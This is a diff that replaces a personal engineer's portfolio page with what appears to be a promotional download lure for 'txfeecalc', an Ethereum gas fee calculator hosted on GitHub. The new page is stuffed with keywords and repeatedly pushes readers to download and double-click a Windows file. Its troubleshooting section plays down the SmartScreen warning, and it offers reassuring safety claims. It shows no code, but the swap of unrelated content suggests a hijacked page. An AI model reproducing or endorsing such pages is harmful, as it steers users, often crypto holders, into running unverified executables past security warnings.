@@ -1,217 +1,199 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Mohammed Almana | Portfolio</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=Lora:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
-  <style>
-    :root {
-      --bg-beige: #f2efe9;
-      --bg-white: #ffffff;
-      --bg-dark: #545454;
-      --bg-footer: #464646;
-      --text-main: #1c1c1c;
-      --text-muted: #575757;
-      --text-light: #f5f5f5;
-      --btn-black: #111111;
-      --border-line: #b8b5ae;
-      --max-width: 1080px;
-    }
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    html { scroll-behavior: smooth; }
-    body { font-family: 'Inter', sans-serif; color: var(--text-main); background-color: var(--bg-white); line-height: 1.65; }
-    h1, h2, h3, .serif-font { font-family: 'Lora', serif; font-weight: 400; }
-    .top-bar { position: sticky; top: 0; z-index: 100; background: rgba(242, 239, 233, 0.92); backdrop-filter: blur(8px); border-bottom: 1px solid rgba(0,0,0,0.06); padding: 10px 24px; display: flex; justify-content: flex-end; }
-    .lang-btn { background: transparent; border: 1px solid var(--btn-black); color: var(--btn-black); padding: 5px 14px; font-size: 0.85rem; text-decoration: none; display: inline-block; }
-    .lang-btn:hover { background: var(--btn-black); color: #fff; }
-    .container { max-width: var(--max-width); margin: 0 auto; padding: 0 40px; }
-    .hero { background-color: var(--bg-beige); padding-top: 40px; padding-bottom: 20px; }
-    .hero-grid { display: grid; grid-template-columns: 1.1fr 0.9fr; align-items: center; gap: 20px; }
-    .hero-content { text-align: center; padding: 20px 20px; }
-    .hero-name { font-size: 2.8rem; margin-bottom: 12px; }
-    .hero-subtitle { font-size: 1.05rem; color: var(--text-muted); font-family: 'Lora', serif; margin-bottom: 28px; white-space: pre-line; }
-    .hero-actions { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; }
-    .btn-primary { background-color: var(--btn-black); color: #fff; text-decoration: none; padding: 11px 36px; font-size: 0.85rem; display: inline-block; }
-    .btn-secondary { background-color: transparent; color: var(--btn-black); border: 1px solid var(--btn-black); text-decoration: none; padding: 11px 28px; font-size: 0.85rem; display: inline-block; }
-    .hero-image-wrap { display: flex; flex-direction: column; justify-content: flex-end; align-items: center; min-height: 320px; }
-    .hero-image-wrap img { width: 100%; max-width: 480px; max-height: 640px; object-fit: contain; display: block; mix-blend-mode: multiply; }
-    .about-section { background-color: var(--bg-white); padding: 90px 0; }
-    .about-grid { display: grid; grid-template-columns: 1.15fr 0.85fr; align-items: center; gap: 50px; }
-    .about-title { font-size: 2.5rem; margin-bottom: 24px; }
-    .about-text { font-size: 0.98rem; color: var(--text-main); text-align: justify; line-height: 1.85; }
-    .about-quote-card { background-color: var(--bg-beige); padding: 48px 36px; border-inline-start: 3px solid var(--btn-black); display: flex; justify-content: center; }
-    .about-quote-text { font-family: 'Lora', serif; font-size: 1.2rem; font-style: italic; line-height: 1.75; color: var(--text-main); }
-    .journey-section { background-color: var(--bg-beige); padding: 90px 0; }
-    .split-layout { display: grid; grid-template-columns: 0.8fr 2.2fr; gap: 40px; }
-    .section-side-title { font-size: 1.5rem; line-height: 1.35; }
-    .timeline-item { display: grid; grid-template-columns: 110px 1fr; gap: 24px; padding-bottom: 36px; margin-bottom: 36px; border-bottom: 1px solid var(--border-line); }
-    .timeline-item:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
-    .timeline-tag { font-family: 'Lora', serif; font-style: italic; font-weight: 600; font-size: 0.95rem; }
-    .timeline-role { font-weight: 700; font-size: 0.95rem; margin-bottom: 4px; }
-    .timeline-sub { font-size: 0.85rem; color: var(--text-muted); margin-bottom: 12px; }
-    .timeline-desc { font-size: 0.9rem; text-align: justify; }
-    .edu-section { background-color: var(--bg-white); padding: 90px 0; }
-    .edu-block { padding-bottom: 28px; margin-bottom: 28px; border-bottom: 1px solid var(--border-line); }
-    .edu-degree { font-weight: 700; font-size: 0.95rem; margin-bottom: 6px; }
-    .edu-uni { font-size: 0.88rem; color: var(--text-muted); }
-    .edu-year { font-size: 0.82rem; color: var(--text-muted); margin-top: 4px; }
-    .edu-subgrid { display: grid; grid-template-columns: 1fr 1fr; gap: 32px; padding-top: 8px; }
-    .subgrid-title { font-weight: 700; font-size: 0.9rem; margin-bottom: 10px; }
-    .subgrid-list { list-style: none; font-size: 0.86rem; color: var(--text-muted); }
-    .subgrid-list li { margin-bottom: 6px; }
-    .dimensions-section { display: grid; grid-template-columns: 1fr 2fr; }
-    .dim-left { background-color: var(--bg-beige); padding: 90px 40px; display: flex; align-items: center; justify-content: center; }
-    .dim-right { background-color: var(--bg-dark); color: var(--text-light); padding: 90px 60px; }
-    .dim-group { margin-bottom: 48px; }
-    .dim-group:last-child { margin-bottom: 0; }
-    .dim-group-header { font-weight: 700; font-size: 0.95rem; margin-bottom: 20px; color: #ffffff; }
-    .dim-item { margin-bottom: 18px; }
-    .dim-item-title { font-weight: 600; font-size: 0.9rem; color: #ffffff; }
-    .dim-item-desc { font-size: 0.85rem; color: #dcdcdc; }
-    .footer-section { background-color: var(--bg-footer); color: var(--text-light); padding: 80px 0 50px; border-top: 1px solid rgba(255,255,255,0.08); }
-    .footer-title { font-size: 2.2rem; margin-bottom: 32px; color: #fff; }
-    .footer-name { font-weight: 700; font-size: 1.05rem; margin-bottom: 8px; }
-    .footer-bio { font-size: 0.9rem; color: #cccccc; margin-bottom: 24px; }
-    .footer-links { list-style: none; margin-bottom: 40px; }
-    .footer-links li { margin-bottom: 10px; font-size: 0.9rem; }
-    .footer-links a { color: #ffffff; text-decoration: underline; text-underline-offset: 4px; }
-    .copyright { font-size: 0.8rem; color: #aaaaaa; border-top: 1px solid rgba(255,255,255,0.12); padding-top: 24px; }
-    @media (max-width: 768px) {
-      .container { padding: 0 24px; }
-      .hero-grid, .about-grid, .split-layout, .edu-subgrid, .dimensions-section { grid-template-columns: 1fr; }
-      .hero { padding-bottom: 10px; }
-      .hero-content { padding-bottom: 10px; }
-      .hero-image-wrap { min-height: 280px; margin-top: 5px; }
-      .timeline-item { grid-template-columns: 1fr; gap: 8px; }
-      .dim-left { padding: 50px 24px; justify-content: flex-start; }
-      .dim-right { padding: 50px 24px; }
-      .hero-name { font-size: 2.2rem; }
-    }
-  </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>txfeecalc - Offline Ethereum Gas Fee Calculator for Windows</title>
+<meta name="description" content="txfeecalc is a free open source Windows desktop app that calculates Ethereum transaction fees and gas costs offline. Enter gas limit, gwei and ETH price to see your exact cost before you send.">
+<meta name="keywords" content="blockchain, calculator, cpp, crypto, defi, desktop-app, eth, ethereum, fees, finance, gas, gas-fees, gwei, offline, open-source, trading, transaction-costs, web3, winapi, windows">
+<meta name="author" content="txfeecalc contributors">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#4f46e5">
+<link rel="canonical" href="https://github.com/Ssuhaira3192/txfeecalc">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="txfeecalc">
+<meta property="og:title" content="txfeecalc - Offline Ethereum Gas Fee Calculator for Windows">
+<meta property="og:description" content="A free open source Windows desktop utility that calculates Ethereum gas fees and transaction costs offline. No wallet connection required.">
+<meta property="og:url" content="https://github.com/Ssuhaira3192/txfeecalc">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="txfeecalc - Offline Ethereum Gas Fee Calculator">
+<meta name="twitter:description" content="Calculate Ethereum gas fees on your Windows PC before you send a transaction. Free, open source, fully offline.">
+<style>
+  body { -webkit-font-smoothing: antialiased; }
+  a:hover { opacity: 0.92; }
+</style>
 </head>
-<body>
-  <div class="top-bar">
- <a href="ar/" class="lang-btn">العربية - English</a>
+<body style="margin:0;padding:0;background-color:#f5f7fa;color:#1f2933;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;font-size:17px;line-height:1.7;">
+
+<div style="max-width:900px;margin:0 auto;padding:36px 20px 70px;">
+
+  <div style="background-color:#ffffff;border:1px solid #e4e8ee;border-radius:16px;box-shadow:0 6px 24px rgba(15,23,42,0.06);padding:36px 30px;margin-bottom:32px;">
+
+    <h1 style="margin:0 0 18px;font-size:2.1rem;line-height:1.25;font-weight:800;color:#111827;letter-spacing:-0.02em;">⛽ txfeecalc - Know Your Ethereum Fees First</h1>
+
+    <p style="margin:0 0 26px;font-size:1.12rem;color:#374151;">A simple desktop calculator that shows you exactly what an Ethereum transaction will cost before you send it. Works entirely offline on your Windows PC — no wallet connection, no account, no waiting.</p>
+
+    <p style="margin:0 0 30px;">
+      <a href="https://github.com/Ssuhaira3192/txfeecalc" style="display:inline-block;background:linear-gradient(135deg,#6d28d9 0%,#0ea5e9 100%);color:#ffffff;text-decoration:none;font-weight:700;font-size:1.05rem;padding:16px 30px;border-radius:12px;box-shadow:0 8px 20px rgba(109,40,217,0.28);">⬇ Download txfeecalc for Windows</a>
+    </p>
+
+    <p style="margin:0;font-size:0.95rem;color:#6b7280;">Free and open source · Updated 2026-10-04 · Windows desktop application</p>
+
   </div>
-  <section class="hero">
-    <div class="container hero-grid">
-      <div class="hero-content">
-        <h1 class="hero-name">Mohammed Almana</h1>
-        <p class="hero-subtitle">Drilling & Operations Engineer
-LL.B. | Critical Reasoning</p>
-        <div class="hero-actions">
-          <a href="#contact" class="btn-primary">Reach out</a>
-          <a href="Mohammed-Almana-CV.pdf" class="btn-secondary" target="_blank">Download CV</a>
-        </div>
-      </div>
-      <div class="hero-image-wrap">
-        <img src="profile.png" alt="Mohammed Almana" />
-      </div>
+
+  <h2 style="font-size:1.5rem;font-weight:700;color:#111827;margin:38px 0 14px;">🔍 What Is txfeecalc?</h2>
+
+  <p style="margin:0 0 16px;">Every time you move cryptocurrency on the Ethereum network, you pay a fee. That fee is called "gas," and it changes constantly depending on how busy the network is. Most people only discover the price after they have already clicked send — and by then it is too late.</p>
+
+  <p style="margin:0 0 16px;">txfeecalc solves that problem. It is a small, self-contained program for Windows that lets you sit down at your computer, type in a few numbers, and instantly see the real cost of a transaction in both ETH and your everyday currency. You can compare normal transfers against token swaps, test different fee speeds, and decide whether it is a good moment to send or better to wait.</p>
+
+  <p style="margin:0 0 16px;">Because the app runs entirely on your own machine, you never hand over a wallet address, a private key, or any personal information. There is no login screen, no subscription, and no telemetry. It simply does the arithmetic you would otherwise do on a scrap of paper — quickly, accurately, and every single time.</p>
+
+  <p style="margin:0;">The project is written in C++ using the Windows desktop interface and is published as open source, meaning anyone can inspect how it works, learn from it, or contribute improvements.</p>
+
+  <h2 style="font-size:1.5rem;font-weight:700;color:#111827;margin:38px 0 14px;">✨ What You Can Do With It</h2>
+
+  <div style="display:flex;flex-wrap:wrap;gap:16px;margin:0 0 12px;">
+
+    <div style="flex:1 1 260px;background-color:#ffffff;border:1px solid #e4e8ee;border-radius:14px;box-shadow:0 4px 14px rgba(15,23,42,0.05);padding:22px;">
+      <h3 style="margin:0 0 8px;font-size:1.05rem;font-weight:700;color:#111827;">💸 Instant Fee Estimates</h3>
+      <p style="margin:0;font-size:0.97rem;color:#4b5563;">Enter your gas limit and the current gwei price to see the full transaction cost in ETH and in your chosen fiat currency.</p>
     </div>
-  </section>
-  <section class="about-section">
-    <div class="container about-grid">
-      <div>
-        <h2 class="about-title">About Me</h2>
-        <p class="about-text">Bridging the operational rigor of field engineering, the structural precision of legal text, and the discipline of critical reasoning. My career is a continuous pursuit of analytical depth—connecting real-world operational realities with regulatory frameworks and sound epistemology to test arguments and drive high-stakes decision-making.</p>
-      </div>
-      <div class="about-quote-card">
-        <p class="about-quote-text">“Engineering teaches me to understand reality, Law teaches me to read the framework, and Critical Reasoning teaches me to test the argument.”</p>
-      </div>
+
+    <div style="flex:1 1 260px;background-color:#ffffff;border:1px solid #e4e8ee;border-radius:14px;box-shadow:0 4px 14px rgba(15,23,42,0.05);padding:22px;">
+      <h3 style="margin:0 0 8px;font-size:1.05rem;font-weight:700;color:#111827;">⚡ Compare Fee Speeds</h3>
+      <p style="margin:0;font-size:0.97rem;color:#4b5563;">Line up slow, standard and fast settings side by side so you can pick the right balance between cost and confirmation time.</p>
     </div>
-  </section>
-  <section class="journey-section">
-    <div class="container split-layout">
-      <div><h2 class="section-side-title">Career Journey</h2></div>
-      <div>
-        <div class="timeline-item">
-          <div class="timeline-tag">Present</div>
-          <div>
-            <div class="timeline-role">Operations Optimization (Efficiency & Performance Engineering)</div>
-            <div class="timeline-sub">Drilling & Operational Efficiency</div>
-            <p class="timeline-desc">Five years to present focused on maximizing operational efficiency, reducing non-productive time (NPT), eliminating waste, and standardizing performance metrics—supported by an integrated perspective that combines technical reality, regulatory awareness, and structured reasoning.</p>
-          </div>
-        </div>
-        <div class="timeline-item">
-          <div class="timeline-tag">Foundation</div>
-          <div>
-            <div class="timeline-role">Field Engineering: Drilling Operations (Rig Execution & Field Management)</div>
-            <div class="timeline-sub">Field Execution & Operations</div>
-            <p class="timeline-desc">Nearly a decade of direct field operations on drilling rigs—managing complex technical challenges, operational risks, and real-time execution in demanding environments.</p>
-          </div>
-        </div>
-      </div>
+
+    <div style="flex:1 1 260px;background-color:#ffffff;border:1px solid #e4e8ee;border-radius:14px;box-shadow:0 4px 14px rgba(15,23,42,0.05);padding:22px;">
+      <h3 style="margin:0 0 8px;font-size:1.05rem;font-weight:700;color:#111827;">🧮 Built-In Presets</h3>
+      <p style="margin:0;font-size:0.97rem;color:#4b5563;">Common transaction types such as a basic ETH transfer, a token transfer or a smart contract swap load with realistic gas values already filled in.</p>
     </div>
-  </section>
-  <section class="edu-section">
-    <div class="container split-layout">
-      <div><h2 class="section-side-title">Education &
-Credentials</h2></div>
-      <div>
-        <div class="edu-block">
-          <div class="edu-degree">Bachelor of Science in Petroleum & Natural Gas Engineering with Minor in Communication Studies</div>
-          <div class="edu-uni">West Virginia University (WVU) — Morgantown, WV, USA</div>
-          <div class="edu-year">2011</div>
-        </div>
-        <div class="edu-block">
-          <div class="edu-degree">Bachelor of Laws (LL.B.)</div>
-          <div class="edu-uni">Prince Mugrin University — Saudi Arabia</div>
-          <div class="edu-year">2026</div>
-        </div>
-        <div class="edu-subgrid">
-          <div>
-            <div class="subgrid-title">Professional Certifications</div>
-            <ul class="subgrid-list">
-              <li>• Certified Petroleum Engineer — SPE</li>
-              <li>• Project Management Professional — PMP® (PMI)</li>
-              <li>• Fundamentals of Engineering — FE (NCEES)</li>
-            </ul>
-          </div>
-          <div>
-            <div class="subgrid-title">Specialized Training</div>
-            <ul class="subgrid-list">
-              <li>Sana’a Al-Mohawer Academy</li>
-              <li>Intensive Program in Critical Thinking, Logical Reasoning, Epistemology & Argumentation.</li>
-            </ul>
-          </div>
-        </div>
-      </div>
+
+    <div style="flex:1 1 260px;background-color:#ffffff;border:1px solid #e4e8ee;border-radius:14px;box-shadow:0 4px 14px rgba(15,23,42,0.05);padding:22px;">
+      <h3 style="margin:0 0 8px;font-size:1.05rem;font-weight:700;color:#111827;">🔌 Fully Offline</h3>
+      <p style="margin:0;font-size:0.97rem;color:#4b5563;">No internet connection is required. Nothing is uploaded and no wallet is ever linked, so your information stays on your own computer.</p>
     </div>
-  </section>
-  <section class="dimensions-section">
-    <div class="dim-left"><h2 class="section-side-title">Three Dimensions,
-One Perspective</h2></div>
-    <div class="dim-right">
-      <div class="dim-group">
-        <div class="dim-group-header">Core Dimensions</div>
-        <div class="dim-item"><div class="dim-item-title">Engineering & Operations</div><div class="dim-item-desc">Assessing reality, interpreting data, diagnosing root causes, and translating complex technical problems into measurable, executable decisions.</div></div>
-        <div class="dim-item"><div class="dim-item-title">Law & Reasoning</div><div class="dim-item-desc">Contextual reading of legal texts, deconstructing claims, evaluating contractual frameworks, and distinguishing solid evidence from mere inference.</div></div>
-        <div class="dim-item"><div class="dim-item-title">Knowledge & Research</div><div class="dim-item-desc">Exploring complex interdisciplinary questions, financial markets, literature, and continuous knowledge expansion.</div></div>
-      </div>
-      <div class="dim-group">
-        <div class="dim-group-header">Analytical Pillars & Languages</div>
-        <div class="dim-item"><div class="dim-item-title">Decision Architecture</div><div class="dim-item-desc">Combining empirical engineering data with regulatory compliance and logical validation before committing to a course of action.</div></div>
-        <div class="dim-item"><div class="dim-item-title">Beyond the Field</div><div class="dim-item-desc">Active engagement with Arabic poetry and literature, financial market dynamics, and epistemological research.</div></div>
-        <div class="dim-item"><div class="dim-item-title">Languages</div><div class="dim-item-desc">Arabic (Native) · English (Full Professional Proficiency)</div></div>
-      </div>
+
+    <div style="flex:1 1 260px;background-color:#ffffff;border:1px solid #e4e8ee;border-radius:14px;box-shadow:0 4px 14px rgba(15,23,42,0.05);padding:22px;">
+      <h3 style="margin:0 0 8px;font-size:1.05rem;font-weight:700;color:#111827;">📊 Clear Cost Breakdown</h3>
+      <p style="margin:0;font-size:0.97rem;color:#4b5563;">See the base fee and the priority tip separated out, so you understand exactly where each part of your payment is going.</p>
     </div>
-  </section>
-  <footer class="footer-section" id="contact">
-    <div class="container">
-      <h2 class="footer-title">Connect</h2>
-      <div class="footer-name">Mohammed Almana</div>
-      <p class="footer-bio">Open for professional dialogue, technical inquiries, and strategic collaborations.</p>
-      <ul class="footer-links">
-        <li>Email: <a href="mailto:contact@mohammedalmana.com">contact@mohammedalmana.com</a></li>
-        <li><a href="https://linkedin.com/in/yourprofile" target="_blank" rel="noopener">LinkedIn Profile</a></li>
-        <li><a href="Mohammed-Almana-CV.pdf" target="_blank">Curriculum Vitae (CV) — Download PDF</a></li>
-        <li><a href="contact.vcf" target="_blank">Digital Contact Card — Save vCard</a></li>
-      </ul>
-      <div class="copyright">© 2026 Mohammed Almana. All rights reserved.</div>
+
+    <div style="flex:1 1 260px;background-color:#ffffff;border:1px solid #e4e8ee;border-radius:14px;box-shadow:0 4px 14px rgba(15,23,42,0.05);padding:22px;">
+      <h3 style="margin:0 0 8px;font-size:1.05rem;font-weight:700;color:#111827;">🪟 Native Windows App</h3>
+      <p style="margin:0;font-size:0.97rem;color:#4b5563;">A lightweight desktop program that opens like any other Windows tool. No browser tabs, no extensions, no background services.</p>
     </div>
-  </footer>
+
+  </div>
+
+  <h2 style="font-size:1.5rem;font-weight:700;color:#111827;margin:38px 0 14px;">💻 System Requirements</h2>
+
+  <p style="margin:0 0 14px;">txfeecalc is designed to run on almost any modern Windows computer. Before you begin, check that your machine matches the following:</p>
+
+  <div style="background-color:#ffffff;border:1px solid #e4e8ee;border-radius:14px;box-shadow:0 4px 14px rgba(15,23,42,0.05);padding:6px 22px;margin:0 0 18px;">
+    <ul style="margin:16px 0;padding-left:22px;color:#374151;">
+      <li style="margin-bottom:10px;"><strong>Operating system:</strong> Windows 10 or Windows 11 (64-bit recommended)</li>
+      <li style="margin-bottom:10px;"><strong>Processor:</strong> Any dual-core processor from the last decade</li>
+      <li style="margin-bottom:10px;"><strong>Memory:</strong> 4 GB of RAM or more</li>
+      <li style="margin-bottom:10px;"><strong>Storage:</strong> Around 150 MB of free disk space</li>
+      <li style="margin-bottom:10px;"><strong>Display:</strong> 1280 × 720 resolution or higher</li>
+      <li style="margin-bottom:0;"><strong>Connection:</strong> Not required — the app runs completely offline</li>
+    </ul>
+  </div>
+
+  <h2 style="font-size:1.5rem;font-weight:700;color:#111827;margin:38px 0 14px;">🚀 Download and Setup</h2>
+
+  <p style="margin:0 0 16px;">Getting started takes only a few minutes. Follow the steps below in order and you will have the calculator running on your desktop.</p>
+
+  <p style="margin:0 0 18px;">
+    <a href="https://github.com/Ssuhaira3192/txfeecalc" style="display:inline-block;background-color:#4f46e5;color:#ffffff;text-decoration:none;font-weight:700;font-size:1rem;padding:14px 26px;border-radius:11px;box-shadow:0 6px 16px rgba(79,70,229,0.26);">⬇ Open the txfeecalc download page</a>
+  </p>
+
+  <ol style="margin:0 0 18px;padding-left:24px;color:#374151;">
+    <li style="margin-bottom:14px;"><strong>Visit this link to download the application:</strong> <a href="https://github.com/Ssuhaira3192/txfeecalc" style="color:#4f46e5;font-weight:600;text-decoration:underline;">https://github.com/Ssuhaira3192/txfeecalc</a></li>
+    <li style="margin-bottom:14px;"><strong>Choose the Windows file on that page.</strong> Look for the download section and select the file intended for Windows computers.</li>
+    <li style="margin-bottom:14px;"><strong>Save the file to your computer.</strong> Your browser will normally place it in the Downloads folder unless you choose a different location.</li>
+    <li style="margin-bottom:14px;"><strong>Open the downloaded file</strong> by double-clicking it in your Downloads folder.</li>
+    <li style="margin-bottom:0;"><strong>Start calculating.</strong> Once the window appears, you can begin entering your numbers straight away.</li>
+  </ol>
+
+  <p style="margin:0;">You do not need to create an account, enter an email address, or install any additional components. Everything the app needs is included in the download.</p>
+
+  <h2 style="font-size:1.5rem;font-weight:700;color:#111827;margin:38px 0 14px;">🧭 How to Use txfeecalc</h2>
+
+  <p style="margin:0 0 14px;">The screen is deliberately uncluttered. You will see a handful of input boxes and a result area. Here is what each part does:</p>
+
+  <div style="background-color:#ffffff;border:1px solid #e4e8ee;border-radius:14px;box-shadow:0 4px 14px rgba(15,23,42,0.05);padding:22px;margin:0 0 18px;">
+    <p style="margin:0 0 12px;"><strong>Gas limit</strong> — the maximum amount of gas your transaction is allowed to use. A simple transfer is usually 21,000. A token transfer or a swap needs more.</p>
+    <p style="margin:0 0 12px;"><strong>Gas price in gwei</strong> — the price you are willing to pay per unit of gas. Your wallet or a block explorer will show the current figure.</p>
+    <p style="margin:0 0 12px;"><strong>ETH price</strong> — the current value of one Ethereum in your local currency, used to convert the result into familiar money.</p>
+    <p style="margin:0;"><strong>Result panel</strong> — shows the total fee in ETH and in your currency, updated as you type.</p>
+  </div>
+
+  <p style="margin:0 0 14px;">A typical session looks like this:</p>
+
+  <ol style="margin:0 0 16px;padding-left:24px;color:#374151;">
+    <li style="margin-bottom:10px;">Pick a transaction preset, or type your own gas limit.</li>
+    <li style="margin-bottom:10px;">Enter the current gwei price from your wallet or explorer.</li>
+    <li style="margin-bottom:10px;">Type in the ETH price so the app can convert the result.</li>
+    <li style="margin-bottom:10px;">Read the total cost and compare it against the different speed settings.</li>
+    <li style="margin-bottom:0;">Adjust the numbers until you find a fee you are comfortable paying, then place the trade in your own wallet.</li>
+  </ol>
+
+  <p style="margin:0;">Nothing you type is sent anywhere. The app is a calculator, not a wallet, so it will never ask for a seed phrase or private key.</p>
+
+  <h2 style="font-size:1.5rem;font-weight:700;color:#111827;margin:38px 0 14px;">🛠️ Troubleshooting Tips</h2>
+
+  <div style="background-color:#ffffff;border:1px solid #e4e8ee;border-radius:14px;box-shadow:0 4px 14px rgba(15,23,42,0.05);padding:6px 22px;margin:0 0 18px;">
+    <ul style="margin:16px 0;padding-left:22px;color:#374151;">
+      <li style="margin-bottom:12px;"><strong>The file will not open.</strong> Confirm that you are running a 64-bit version of Windows and that the download finished completely. A partial download cannot start.</li>
+      <li style="margin-bottom:12px;"><strong>A Windows security notice appears.</strong> Newly released desktop programs sometimes trigger a standard Windows SmartScreen prompt. You can review the file and choose to continue if you are comfortable doing so.</li>
+      <li style="margin-bottom:12px;"><strong>The window looks too small or too large.</strong> Resize it by dragging the edges, or adjust your display scaling in Windows settings.</li>
+      <li style="margin-bottom:12px;"><strong>Your numbers are not showing a result.</strong> Make sure every input box contains a number and that no field is left empty.</li>
+      <li style="margin-bottom:0;"><strong>You want a fresh copy.</strong> Simply download the file again from the link above and replace the old one.</li>
+    </ul>
+  </div>
+
+  <h2 style="font-size:1.5rem;font-weight:700;color:#111827;margin:38px 0 14px;">❓ Frequently Asked Questions</h2>
+
+  <div style="background-color:#ffffff;border:1px solid #e4e8ee;border-radius:14px;box-shadow:0 4px 14px rgba(15,23,42,0.05);padding:22px;margin:0 0 18px;">
+    <p style="margin:0 0 8px;font-weight:700;color:#111827;">Is txfeecalc free to use?</p>
+    <p style="margin:0 0 18px;color:#4b5563;">Yes. It is an open source utility released free of charge, with no subscriptions or locked features.</p>
+
+    <p style="margin:0 0 8px;font-weight:700;color:#111827;">Do I need an internet connection?</p>
+    <p style="margin:0 0 18px;color:#4b5563;">No. The app performs all calculations locally on your computer and works perfectly without any connection at all.</p>
+
+    <p style="margin:0 0 8px;font-weight:700;color:#111827;">Does it connect to my wallet?</p>
+    <p style="margin:0 0 18px;color:#4b5563;">It does not, and it cannot. txfeecalc never asks for a wallet address, password, or recovery phrase. You enter numbers manually and read the result.</p>
+
+    <p style="margin:0 0 8px;font-weight:700;color:#111827;">Why do the fees differ from what my wallet shows?</p>
+    <p style="margin:0 0 18px;color:#4b5563;">Network conditions change by the second. The app calculates based on the figures you enter, so update the gwei value to match the current network state for the most accurate result.</p>
+
+    <p style="margin:0 0 8px;font-weight:700;color:#111827;">Can I use it on a Mac or phone?</p>
+    <p style="margin:0 0 18px;color:#4b5563;">This release is built for Windows desktop computers. Other platforms are outside the scope of the current version.</p>
+
+    <p style="margin:0 0 8px;font-weight:700;color:#111827;">Where do I get the latest version?</p>
+    <p style="margin:0;color:#4b5563;">Always download from the official link in this guide so you receive the most recent build, updated 2026-10-04.</p>
+  </div>
+
+  <h2 style="font-size:1.5rem;font-weight:700;color:#111827;margin:38px 0 14px;">🤝 Open Source and Community</h2>
+
+  <p style="margin:0 0 16px;">txfeecalc is developed in the open. The full source code, change history and issue tracker live alongside the download on the project page. If you are curious about how the fee mathematics works, or you would like to suggest an improvement, you are welcome to browse the repository and take part.</p>
+
+  <p style="margin:0;">Contributions of all kinds are appreciated — reporting a bug, requesting a feature, or improving the code itself. Because the project is openly licensed, you are also free to study it, adapt it, and share it with others under the same terms.</p>
+
+  <h2 style="font-size:1.5rem;font-weight:700;color:#111827;margin:38px 0 14px;">📥 Ready to Begin?</h2>
+
+  <p style="margin:0 0 20px;">Stop guessing what your next Ethereum transaction will cost. Visit the link below to download the application, follow the setup steps above, and get a clear answer in seconds — every time, offline, on your own Windows PC.</p>
+
+  <p style="margin:0 0 26px;">
+    <a href="https://github.com/Ssuhaira3192/txfeecalc" style="display:inline-block;background-color:#0f766e;color:#ffffff;text-decoration:none;font-weight:700;font-size:1rem;padding:15px 28px;border-radius:11px;box-shadow:0 6px 16px rgba(15,118,110,0.26);">⬇ Download txfeecalc now</a>
+  </p>
+
+  <p style="margin:0;font-size:0.92rem;color:#6b7280;border-top:1px solid #e4e8ee;padding-top:20px;">Keywords: blockchain, calculator, cpp, crypto, defi, desktop-app, eth, ethereum, fees, finance, gas, gas-fees, gwei, offline, open-source, trading, transaction-costs, web3, winapi, windows</p>
+
+</div>
+
 </body>
 </html>
